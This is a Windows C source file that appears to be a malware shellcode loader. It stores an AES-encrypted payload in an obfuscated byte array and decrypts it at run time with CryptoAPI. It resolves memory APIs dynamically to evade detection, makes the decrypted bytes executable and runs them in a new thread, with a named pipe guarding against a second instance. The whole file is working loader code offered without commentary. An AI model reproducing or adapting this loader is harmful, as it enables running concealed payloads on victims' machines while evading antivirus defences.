#include<windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<wincrypt.h>
#include<Psapi.h>

unsigned char key[] = { 0x4c, 0x81, 0xd4, 0xb7, 0x36, 0xb8, 0x8f, 0x73, 0xca, 0xdd, 0x49, 0xcb, 0x52, 0xc5, 0x34, 0x1e };
unsigned char Cosmo[] = { 0x8a, 0xc5, 0xd6, 0x4, 0x15, 0x97, 0x9b, 0x80, 0x48, 0x45, 0x6e, 0xd8, 0xca, 0x96, 0xf2, 0xda, 0x2f, 0x84, 0xd, 0x66, 0xb8, 0xb0, 0x7a, 0xa2, 0xa0, 0xdf, 0x3e, 0x88, 0x58, 0x18, 0xb2, 0x11, 0x14, 0x9b, 0x57, 0x88, 0x46, 0x68, 0xff, 0xce, 0x5d, 0x35, 0xaa, 0x1d, 0x67, 0x4b, 0x8a, 0x97, 0x18, 0xf4, 0x1d, 0xbb, 0x38, 0x45, 0x24, 0x2d, 0x2e, 0x6b, 0xdc, 0x12, 0xe6, 0x11, 0x92, 0xbf, 0xa7, 0xcc, 0x17, 0xf9, 0xf2, 0x73, 0xf5, 0x36, 0x52, 0x59, 0x5d, 0xe3, 0x3d, 0x22, 0xff, 0xbb, 0xdf, 0xbe, 0xe9, 0x8b, 0xac, 0xbc, 0x8f, 0x41, 0xe5, 0xb1, 0xd2, 0x6e, 0xc5, 0x85, 0x7a, 0x80, 0x6e, 0x3e, 0xfa, 0x70, 0x75, 0x9e, 0x30, 0xbd, 0x30, 0x78, 0x64, 0x68, 0x39, 0xe1, 0x2d, 0x55, 0xe, 0x24, 0xd8, 0x9b, 0xb5, 0x70, 0x82, 0xcf, 0x1, 0xf2, 0xd1, 0xf4, 0xf6, 0x33, 0x63, 0x9b, 0xb4, 0xa, 0x19, 0x40, 0xd5, 0x3f, 0x54, 0xa6, 0x4f, 0xdc, 0x4a, 0x50, 0x28, 0xe1, 0xf3, 0x2, 0xfa, 0x7a, 0x9a, 0x46, 0x43, 0xd, 0x18, 0xe3, 0x36, 0xb6, 0xaa, 0x4d, 0x8b, 0x4e, 0x5e, 0x4a, 0x43, 0xe4, 0x99, 0xe9, 0x87, 0x20, 0xcc, 0x5d, 0xad, 0x30, 0xcf, 0x1f, 0x4d, 0xdb, 0xc8, 0x7, 0xbb, 0x63, 0x47, 0xe, 0x4d, 0x29, 0x4, 0x98, 0xa1, 0x9a, 0x84, 0xbe, 0xb5, 0xbc, 0xa2, 0xd0, 0x67, 0xa8, 0x34, 0x6c, 0x45, 0x14, 0x43, 0xc7, 0xf9, 0x65, 0x73, 0x94, 0x14, 0xa7, 0x1b, 0x52, 0xdc, 0x99, 0x98, 0x4b, 0xea, 0x99, 0x9b, 0x68, 0xf9, 0x39, 0xe8, 0x97, 0x29, 0x6c, 0x9f, 0xe0, 0x19, 0xa, 0xf2, 0x35, 0xe1, 0x46, 0xae, 0x88, 0xed, 0x24, 0x5, 0xe2, 0x19, 0x49, 0xe0, 0x0, 0x3b, 0x4d, 0xe, 0x2b, 0x13, 0xbc, 0x47, 0xa, 0x77, 0xf9, 0x4d, 0x27, 0x9b, 0x54, 0x5a, 0xa9, 0xf2, 0xb2, 0x50, 0x24, 0x57, 0xc6, 0x40, 0x9a, 0x2e, 0xdf, 0x85, 0x8d, 0x90, 0xf3, 0xd8, 0x1d, 0xa8, 0x63, 0x29, 0xee, 0x66, 0x35, 0xbe, 0x29, 0x60, 0x1, 0xde, 0xff, 0x82, 0xc, 0xe6, 0xa7, 0x5c, 0xcc, 0xa8, 0x0, 0xc2, 0xbe, 0xa5, 0x4b, 0x77, 0xc4, 0xa6, 0xe, 0x2d, 0xda, 0xaa, 0x5e, 0x51, 0x6b, 0x60, 0x3f, 0x2d, 0x39, 0xda, 0x2c, 0x9a, 0x39, 0xcc, 0x24, 0xf1, 0x22, 0x12, 0x2a, 0xbd, 0xb3, 0xa3, 0x55, 0x70, 0x6e, 0x24, 0xe4, 0x8, 0xdf, 0x26, 0x80, 0x8d, 0x5e, 0x8f, 0x4c, 0x3f, 0xeb, 0xe, 0x84, 0x7, 0xa9, 0x82, 0x8a, 0xf1, 0x85, 0xae, 0x8a, 0x36, 0x3a, 0x96, 0x36, 0x7e, 0x23, 0x2c, 0x81, 0xd1, 0xf9, 0x93, 0x7e, 0x1a, 0x72, 0x72, 0x64, 0x79, 0x9, 0xd4, 0x50, 0x21, 0x5c, 0xc6, 0x91, 0x3a, 0x38, 0xea, 0x8b, 0x91, 0xd2, 0x33, 0xde, 0x64, 0x6f, 0xca, 0x91, 0x35, 0xf3, 0xde, 0x5f, 0x35, 0x50, 0xde, 0x24, 0xa3, 0xf4, 0x4b, 0x77, 0xc9, 0xc6, 0xad, 0x8a, 0xfc, 0x20, 0x6e, 0x81, 0x3, 0xe, 0xf5, 0x15, 0x32, 0x4f, 0xe8, 0x9e, 0x49, 0xb5, 0x5e, 0x6a, 0xc, 0x37, 0x91, 0xfb, 0xb0, 0x53, 0xa1, 0x8, 0xe3, 0xfd, 0xc6, 0xbd, 0x3a, 0xad, 0xa5, 0x95, 0x92, 0x87, 0xac, 0xc4, 0x25, 0xfb, 0xf7, 0xb6, 0xe5, 0x86, 0xd1, 0x1, 0xd2, 0xe1, 0x2a, 0x74, 0x2f, 0xd5, 0x2c, 0xab, 0x83, 0x77, 0x6e, 0xf5, 0xfc, 0x4, 0xaf, 0xe6, 0x7b, 0x92, 0x27, 0xf8, 0xfd, 0xf9, 0xea, 0x1, 0xa7, 0xa8, 0x7b, 0x3b, 0x1e, 0xc9, 0x7d, 0x42, 0x27, 0x20, 0x25, 0x84, 0x2b, 0xaf, 0xf4, 0xa0, 0xbd, 0xde, 0xfb, 0x74, 0xbb, 0x22, 0x35, 0x35, 0x2e, 0xbb, 0xc8, 0xb6, 0xfa, 0xeb, 0x20, 0x79, 0x4e, 0x3f, 0x91, 0x5, 0xae, 0xc5, 0x9a, 0x95, 0xbc, 0xff, 0xdc, 0x27, 0xe6, 0x2e, 0x5, 0x80, 0xf6, 0x3b, 0x62, 0xef, 0x0, 0x3f, 0xf3, 0x2f, 0xdb, 0x8b, 0xb1, 0x7, 0x9b, 0x3b, 0xf4, 0xd0, 0x7, 0xc1, 0x29, 0x63, 0x3b, 0xbe, 0xf2, 0x12, 0x22, 0x59, 0xf0, 0xbb, 0xea, 0x9a, 0x3e, 0xfe, 0xe2, 0xf, 0x0, 0x68, 0x3d, 0xb5, 0x50, 0xde, 0x8b, 0xf2, 0x3a, 0xe6, 0xae, 0xaf, 0x12, 0x55, 0x1b, 0x39, 0x4e, 0x46, 0x7f, 0xea, 0x40, 0xae, 0x9c, 0x94, 0xa1, 0x0, 0xe2, 0xc5, 0x96, 0x30, 0x31, 0xac, 0xd3, 0x84, 0xb6, 0xd, 0xc2, 0x54, 0xeb, 0x81, 0xee, 0x1b, 0x84, 0xa3, 0xb7, 0xd6, 0x46, 0x52, 0xa5, 0xcd, 0x94, 0x7d, 0xb7, 0xba, 0x9b, 0xb, 0xe6, 0x8e, 0x19, 0xbe, 0x42, 0xb5, 0x5, 0x24, 0xdd, 0xb3, 0x84, 0xb4, 0xf4, 0x41, 0xd9, 0x9c, 0xaf, 0x95, 0xd5, 0x1b, 0x80, 0xcc, 0xad, 0x53, 0xca, 0xd6, 0x27, 0xb9, 0x2e, 0x70, 0x8e, 0xd5, 0x90, 0x3e, 0xdc, 0xe7, 0x60, 0xd6, 0x34, 0x84, 0xab, 0x19, 0x1d, 0x8c, 0x54, 0x8a, 0x21, 0x89, 0xa3, 0x99, 0x14, 0x94, 0xa, 0xf1, 0xd2, 0xec, 0xd1, 0x9c, 0x3e, 0x30, 0x1c, 0x62, 0x7f, 0x2f, 0xce, 0xa1, 0x4f, 0x54, 0xe4, 0x2c, 0xe5, 0x1a, 0x85, 0x45, 0xe2, 0xd5, 0x7a, 0xdd, 0xd5, 0x1, 0xce, 0xd2, 0xec, 0x98, 0x40, 0xff, 0xda, 0x1, 0x14, 0x3d, 0x0, 0xa5, 0xa2, 0xdb, 0xf, 0x8d, 0x7e, 0xe2, 0xfd, 0x7f, 0x36, 0xb6, 0xbd, 0x53, 0x78, 0xbe, 0xcf, 0xae, 0xc9, 0xba, 0xde, 0x71, 0x44, 0x50, 0xe8, 0x54, 0x6c, 0xfa, 0x97, 0x43, 0x4c, 0x8e, 0xc5, 0x83, 0xfe, 0x39, 0xaf, 0x27, 0xea, 0xd7, 0xbd, 0x86, 0xc7, 0x97, 0x58, 0xec, 0xde, 0xba, 0x5, 0x7c, 0x52, 0x63, 0xf0, 0xa7, 0xbd, 0x2b, 0xc7, 0x34, 0x6f, 0xb5, 0x5e, 0x0, 0xa7, 0x26, 0xc7, 0xf6, 0x5a, 0x27, 0x3f, 0x0, 0xd6, 0xb3, 0x32, 0x33, 0xde, 0x2a, 0x72, 0x99, 0x31, 0xeb, 0x3f, 0xf3, 0x4c, 0x9c, 0x49, 0xc9, 0xf9, 0x10, 0xa0, 0x86, 0x55, 0xc2, 0x33, 0xe3, 0xa7, 0x8a, 0x6e, 0xf, 0x80, 0xf4, 0x27, 0x50, 0xa1, 0x1, 0x2d, 0x86, 0x5a, 0x3e, 0xf4, 0x7d, 0xe3, 0x91, 0xe3, 0x93, 0xc, 0xf5, 0xd8, 0x11, 0x12, 0xf2, 0x6e, 0xd5, 0x6, 0x33, 0x43, 0xaf, 0xf9, 0xf7, 0x66, 0x15, 0xe1, 0xcd, 0xfe, 0x63, 0x64, 0x3b, 0xe9, 0xd9, 0xbc, 0x30, 0x91, 0x68, 0xae, 0x4f, 0xa7, 0x6f, 0xee, 0x55, 0x53, 0x5c, 0x73, 0x8f, 0x52, 0xb6, 0x93, 0xab, 0xcb, 0x49, 0xfd, 0x51, 0x43, 0x3b, 0x6a, 0x4, 0xc4, 0xb1, 0x34, 0xe2, 0x62, 0x29, 0x12, 0x98, 0xa7, 0x7c, 0x8a, 0x25, 0x81, 0xe5, 0xfc, 0x1, 0x76, 0x7d, 0xdb, 0x5e, 0xe7, 0x22, 0x92, 0xe7, 0xbe, 0xe9, 0x2f, 0xf8, 0x1e, 0x7b, 0x24, 0x83, 0x37, 0x14, 0xa3, 0x1e, 0x28, 0x8f, 0xab, 0x52, 0xd8, 0xaf, 0x1f, 0xa9, 0x81, 0x0, 0xbe, 0xc3, 0x23, 0xa, 0x77, 0xb9, 0x78, 0xae, 0xc3, 0x40, 0xe6, 0x66, 0x29, 0x2d, 0xe8, 0x58, 0xd9, 0xd2, 0x71, 0x90, 0xdc, 0x36, 0xa, 0x9, 0x6f, 0xbe, 0xcf, 0xa3, 0xbc, 0x4e, 0x75, 0xa3, 0x62, 0x7f, 0x1c, 0xae, 0xe5, 0x5b, 0x2, 0xe8, 0x85, 0x90, 0xe4, 0x11, 0x45, 0x1b, 0x9c, 0xc2, 0x9e, 0x33, 0xdc, 0x2e, 0x13, 0x78, 0x14, 0x3f, 0x65, 0xd4, 0x29, 0x59, 0x37, 0xf8, 0x23, 0xe9, 0x2f, 0x5e, 0xd4, 0xca, 0x87, 0xbd, 0x87, 0xfb, 0x92, 0xfd, 0xfd, 0xb4, 0x14, 0xab, 0x5b, 0x6, 0x4a, 0xaf, 0xc6, 0x1b, 0xe5, 0x1, 0x6f, 0x29, 0x44, 0x63, 0x77, 0xb9, 0x7, 0xc9, 0xfc, 0x63, 0xb7, 0xb7, 0xe7, 0xcf, 0x39, 0xc8, 0xc5, 0xa8, 0x1a, 0xb4, 0xf5, 0xa2, 0x26, 0xa7, 0xa0, 0xc6, 0xed, 0x2d, 0x47, 0x5d, 0xc7, 0x9f };
unsigned int Nauta = sizeof(Cosmo);

typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

typedef VOID(WINAPI* RtlMoveMemory_t)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);

int AESDecrypt(char* buf, unsigned int buflen, CHAR* key, size_t keylen) {
	
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY  hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}
	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*) buf, (DWORD*) &buflen)) {
		return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0; 
}

HANDLE hSync;

#define PIPENAME "\\\\.\\pipe\\SyncMe"
#define PIPE 1

BOOL IsCosmoRunning(int method) {

	BOOL ret = FALSE;

	if (method == PIPE) {
		hSync = CreateNamedPipe(PIPENAME, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			CloseHandle(hSync);
			ret = TRUE;
		}
	}
	return ret;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	LoadLibrary("user32.dll");
	if (IsCosmoRunning(PIPE)) {
		return 0;
	}

	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(GetModuleHandle("KERNEL32.dll"), "VirtualAlloc");
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandle("KERNEL32.dll"), "RtlMoveMemory");

	exec_mem = pVirtualAlloc(0, Nauta, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	AESDecrypt((char*) Cosmo, Nauta, (CHAR*) key, sizeof(key));

	pRtlMoveMemory(exec_mem, Cosmo, Nauta);

	rv = VirtualProtect(exec_mem, Nauta, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, INFINITE);
		CloseHandle(hSync);
	}
	return 0;
}

